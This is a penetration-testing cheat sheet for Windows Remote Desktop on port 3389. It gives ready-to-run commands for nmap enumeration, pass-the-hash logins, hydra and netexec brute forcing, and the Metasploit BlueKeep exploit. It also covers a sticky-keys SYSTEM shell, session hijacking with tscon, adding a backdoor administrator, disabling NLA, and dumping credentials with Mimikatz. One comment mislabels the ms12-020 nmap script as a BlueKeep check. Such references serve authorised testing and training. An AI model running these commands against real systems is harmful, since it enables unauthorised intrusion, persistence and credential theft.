# Port 3389 - RDP

## Table of Contents

- [Enumeration](#enumeration)
  - [Nmap Scripts](#nmap-scripts)
  - [Service Detection](#service-detection)
- [Connection](#connection)
  - [xfreerdp](#xfreerdp)
  - [rdesktop](#rdesktop)
- [Brute Force](#brute-force)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Nmap Scripts

```shell
# Service detection
nmap -p 3389 -sV $rhost

# RDP enumeration
nmap -p 3389 --script rdp-enum-encryption $rhost
nmap -p 3389 --script rdp-ntlm-info $rhost

# Check for BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-ms12-020 $rhost

# Note: For actual BlueKeep detection, use:
# rdp-vuln-cve-2019-0708.nse (external script) or Metasploit scanner
```

### Service Detection

```shell
# Check if RDP is enabled
nmap -p 3389 -sV $rhost

# Get NLA status
nmap -p 3389 --script rdp-enum-encryption $rhost
```

---

## Connection

### xfreerdp

```shell
# Basic connection
xfreerdp /u:$user /p:$password /v:$rhost

# Domain user
xfreerdp /d:$domain /u:$user /p:$password /v:$rhost

# With clipboard support
xfreerdp /u:$user /p:$password /v:$rhost +clipboard

# Full screen
xfreerdp /u:$user /p:$password /v:$rhost /f

# Custom resolution
xfreerdp /u:$user /p:$password /v:$rhost /w:1920 /h:1080

# Ignore certificate
xfreerdp /u:$user /p:$password /v:$rhost /cert:ignore

# Share local folder
xfreerdp /u:$user /p:$password /v:$rhost /drive:share,/tmp

# Pass the Hash
xfreerdp /u:$user /pth:$ntlm_hash /v:$rhost

# Alternative port
xfreerdp /u:$user /p:$password /v:$rhost:3390
```

### rdesktop

```shell
# Basic connection
rdesktop -u $user -p $password $rhost

# Domain user
rdesktop -u $user -p $password -d $domain $rhost

# Full screen
rdesktop -u $user -p $password -f $rhost

# Custom resolution
rdesktop -u $user -p $password -g 1920x1080 $rhost

# Share local folder
rdesktop -u $user -p $password -r disk:share=/tmp $rhost
```

---

## Brute Force

### Hydra

```shell
hydra -l $user -P /usr/share/wordlists/rockyou.txt rdp://$rhost
hydra -L users.txt -P passwords.txt rdp://$rhost
```

### NetExec

```shell
netexec rdp $rhost -u users.txt -p passwords.txt
netexec rdp $rhost -u $user -p $password
```

### Crowbar

```shell
crowbar -b rdp -s $rhost/32 -u $user -C passwords.txt
```

---

## Exploitation

### BlueKeep (CVE-2019-0708)

> Affects Windows 7, Windows Server 2008 R2

```shell
# Check vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 $rhost

# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS $rhost
set TARGET 1  # Automatic targeting
exploit
```

### Sticky Keys Bypass

> Requires physical/console access or RDP with UAC bypass

```shell
# Replace sethc.exe with cmd.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# At login screen, press Shift 5 times
# Get SYSTEM shell
```

### Enable RDP

```shell
# Windows PowerShell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable

# Registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

## Post-Exploitation

### Session Hijacking

```shell
# List sessions (as admin)
query user

# Hijack session (requires SYSTEM)
tscon 2 /dest:console

# Alternative with PsExec
PsExec.exe -s -i cmd.exe
tscon 2 /dest:console
```

### Add RDP User

```shell
# Add user
net user hacker Password123! /add

# Add to RDP group
net localgroup "Remote Desktop Users" hacker /add

# Add to Administrators (if needed)
net localgroup Administrators hacker /add
```

### Disable NLA

```shell
# PowerShell
(Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices).SetUserAuthenticationRequired(0)

# Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

---

## Credential Extraction

```shell
# Mimikatz - dump credentials from RDP sessions
sekurlsa::logonpasswords

# Extract RDP credentials from memory
sekurlsa::tspkg
```
